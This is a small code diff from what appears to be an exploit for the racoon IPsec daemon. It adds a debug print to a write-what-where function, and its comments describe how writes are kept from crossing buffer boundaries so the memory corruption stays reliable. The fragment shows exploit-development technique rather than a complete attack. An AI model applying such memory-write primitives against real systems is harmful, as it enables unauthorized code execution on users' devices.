@@ -87,6 +87,7 @@ void trigger_exec(int fd,uint32_t padding, uint64_t address) {
 
 // this combines the original bug with the lcconf and makes sure that we never reach the boundary of the racoon buffer so that we don't get interrupted in the middel of it
 void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what) {
+    printf("write what 0x%llx where 0x%llx\n",what,where);
 	// make sure that we don't have writes across page boundaries because we might smash the platform memmove pointer with that write and then the read function that reads in the new buffer uses the memmove and so we jump randomly
 	uint32_t current_chunk_size = total_bytes_written % RACOON_YY_BUF_SIZE;
 	if ((current_chunk_size + BYTES_PER_WRITE) > RACOON_YY_BUF_SIZE) {
